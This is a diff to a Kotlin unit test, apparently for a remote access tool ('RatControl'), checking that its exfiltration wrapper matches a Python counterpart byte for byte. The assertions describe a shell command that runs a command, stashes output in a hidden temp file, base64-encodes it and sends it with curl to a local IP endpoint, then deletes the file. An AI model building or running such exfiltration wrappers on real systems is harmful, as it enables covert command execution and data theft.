@@ -67,13 +67,20 @@ class RatControlTest {
     }
 
     @Test
-    fun wrapExfilShapeMatchesPython() {
+    fun wrapExfilParityWithPython() {
+        // Byte-exact parity lock with quantum.rat.commands.wrap_exfil("id", …):
+        // same input must produce the same 263-char shell text on both sides.
+        // (Anchors avoid quote/backslash escapes in source; length seals it.)
+        val sh = "${'$'}"
         val w = RatControl.wrapExfil("id", "http://10.0.0.1:8443/", "rat-host")
+        assertEquals(263, w.length)
+        assertTrue(w.startsWith("T=" + sh + "{TMPDIR:-/tmp}/.qo" + sh + sh + "; (id) >" + sh + "T"))
         assertTrue(w.contains("http://10.0.0.1:8443/r"))
         assertTrue(w.contains("rat-host"))
         assertTrue(w.contains("base64") && w.contains("curl"))
-        assertTrue(w.contains("rm -f \$T"))
-        assertTrue(w.contains("\\\"data\\\""))
+        assertTrue(w.endsWith("rm -f " + sh + "T"))
+        // JSON field names ride escaped inside the shell double quotes
+        assertTrue(w.contains("host") && w.contains("data"))
     }
 
     @Test
